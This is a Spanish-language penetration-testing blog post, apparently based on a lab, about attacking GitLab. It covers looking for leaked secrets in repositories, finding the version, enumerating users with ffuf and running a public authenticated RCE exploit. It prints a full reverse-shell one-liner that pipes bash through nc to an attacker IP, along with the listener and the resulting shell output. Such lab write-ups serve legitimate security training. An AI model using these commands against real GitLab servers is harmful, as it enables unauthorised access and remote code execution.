---
date: 2025-11-14T00:51:05.000Z
layout: post
comments: true
title: "Gitlab Hacking"
subtitle: 'Tipos de ataque'
description: >-
image: >-
  /images/gitlablogo.png
optimized_image: >-
  /images/gitlablogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - php
author: Felipe Canales Cayuqueo
paginate: true
---

GitLab es una plataforma completa de desarrollo colaborativo que integra control de versiones, integración y entrega continua (CI/CD), gestión de proyectos y seguridad en un mismo entorno. Está basada en Git y permite a equipos de desarrollo crear, revisar y desplegar código de forma centralizada. Además de alojar repositorios, GitLab incluye herramientas para la gestión de incidencias, automatización de pruebas, despliegue de aplicaciones y control de accesos. Su modelo de trabajo “todo en uno” facilita la colaboración entre desarrolladores, DevOps y seguridad, permitiendo un flujo de desarrollo más eficiente, transparente y trazable tanto en entornos locales como en la nube.

Dentro de los repositorios es común encontrar datos interesantes como:

- Scripts con credenciales o claves duras en el código fuente.  
- Archivos de configuración que contienen contraseñas o tokens en texto plano.  
- Claves privadas SSH o certificados expuestos accidentalmente.  
- Variables de entorno (.env) con información sensible.  
- Tokens de API o claves de acceso a servicios en la nube (AWS, Azure, GCP).  
- Credenciales de bases de datos, correos o sistemas internos.  
- Información de conexión a servidores o endpoints internos.  
- Copias de respaldo o archivos comprimidos con datos sensibles.  
- Historial de commits que revelan cambios donde se filtraron secretos.  
- Comentarios o notas dentro del código que contienen datos internos o rutas críticas.  
- Archivos de documentación con instrucciones operativas o contraseñas por defecto.  
- Repositorios internos o públicos con información técnica sobre infraestructura.  
- Archivos de despliegue o scripts de automatización (CI/CD) con credenciales embebidas.  
- Usuarios y correos corporativos expuestos en los commits.  
- Archivos temporales o registros que incluyen trazas de depuración con datos reales.  

Si se pueden obtener credenciales por medio OSINT u otro método, es posible que podamos iniciar sesión en una instancia de GitLab. La autenticación de dos factores está deshabilitada de forma predeterminada.

> No hay mucho que podamos hacer contra GitLab sin saber el número de versión o iniciar sesión. 

Lo primero que debemos intentar es navegar a ```/explore``` y ver si hay algún proyecto público que pueda contener algo interesante. Algunas veces los proyectos dejan credenciales entre los archivos como se da el caso a continuación.

[![gitlab1](/images/gitlab1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/gitlab1.png)

[![gitlab2](/images/gitlab2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/gitlab2.png)

[![gitlab3](/images/gitlab3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/gitlab3.png)


En la parte superior podremos detectar la versión del Gitlab o también otra opción es navegando al directorio ```/help```.

[![gitlab4](/images/gitlab4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/gitlab4.png)

[![gitlab5](/images/gitlab5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/gitlab5.png)

Sin embargo este método no es preciso como si tuvieramos una cuenta ya sea obtenida por medio de fuerza bruta, un leak o al registrarse en la plataforma (nos registramos con el usuario test y contraseña test1234).

[![gitlab6](/images/gitlab6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/gitlab6.png)

De hecho con el usuario test que hemos registrado, ya podremos visualizar algunos repositorios privados que podremos investigar más a fondo.

[![gitlab15](/images/gitlab15.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/gitlab15.png)

En el caso en que no podamos registrar un usuario existe una forma de enumerar usuarios válidos a través del endpoint ```/users/{nombre_de_usuario}/exists```.  
Podemos identificar este endpoint analizando las peticiones que pasan por **BurpSuite**.

[![gitlab11](/images/gitlab11.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/gitlab11.png)

Con la herramienta **ffuf** es posible enviar múltiples nombres de usuario de la siguiente manera:

```
┌──(root㉿nptg)-[/gitlab]
└─# ffuf -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -u 'http://gitlab.inlanefreight.local:8081/users/FUZZ/exists' -t 200 -fr 'false' -fs 118

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://gitlab.inlanefreight.local:8081/users/FUZZ/exists
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: false
 :: Filter           : Response size: 118
________________________________________________

bob                     [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 832ms]
root                    [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 1552ms]
demo                    [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 3824ms]
administrator           [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 3493ms]
Bob                     [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 3768ms]
BOB                     [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 3231ms]
hacker                  [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 3502ms]
```

> Otra forma de enumerar usuarios se encuentra en ```exploitdb``` con el título de [GitLab Community Edition (CE) 13.10.3 - User Enumeration](https://www.exploit-db.com/exploits/49821). También hay otra opción en [Github en python3](https://github.com/dpgg101/GitLabUserEnum). 


Para casos de fuerza bruta en versiones inferiores a 16.6, los valores predeterminados de GitLab están configurados en 10 intentos de inicio de sesión fallidos, lo que resulta en un desbloqueo automático después de 10 minutos. Para las versiones siguientes se puede configurar el límite de intentos manualmente. Como ya tenemos un usuario que registramos anteriormente podemos explotar la vulnerabilidad [Gitlab 13.10.2 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49951).

Para ello nos pondremos a la escucha en algún puerto específico.

```
┌──(root㉿nptg)-[/gitlab]
└─# nc -nlvp 4646                          
listening on [any] 4646 ...
```

Posteriormente ejecutaremos el exploit.

```
┌──(root㉿nptg)-[/gitlab]
└─# python3 gitlabrce.py -t http://gitlab.inlanefreight.local:8081 -u test -p test1234 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.180 4646 >/tmp/f'
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

Finalmente recibiremos la shell inversa.

```
┌──(root㉿nptg)-[/gitlab]
└─# nc -nlvp 4646                          
listening on [any] 4646 ...
connect to [10.10.14.180] from (UNKNOWN) [10.129.201.88] 33414
bash: cannot set terminal process group (1300): Inappropriate ioctl for device
bash: no job control in this shell
git@app04:~/gitlab-workhorse$ whoami
whoami
git
```

También tenemos exploits para otras versiones como:

* [Gitlab 13.9.3 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49944).
* [GitLab 11.4.7 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49257).
* [GitLab 12.9.0 - Arbitrary File Read](https://www.exploit-db.com/exploits/48431).
